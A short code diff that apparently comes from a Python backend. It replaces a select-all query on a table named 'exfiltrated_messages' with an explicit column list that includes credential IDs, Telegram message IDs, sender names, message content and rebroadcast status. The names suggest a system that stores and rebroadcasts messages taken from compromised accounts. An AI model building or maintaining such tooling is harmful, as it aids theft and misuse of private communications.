@@ -11,7 +11,7 @@ async def list_messages(limit: int = 100):
     try:
         res = await execute_async(
             db.table("exfiltrated_messages")
-            .select("*")
+            .select("id,credential_id,telegram_msg_id,sender_name,content,media_type,is_broadcasted,broadcast_error,broadcast_attempts,next_retry_at,created_at")
             .order("created_at", desc=True)
             .limit(limit)
         )
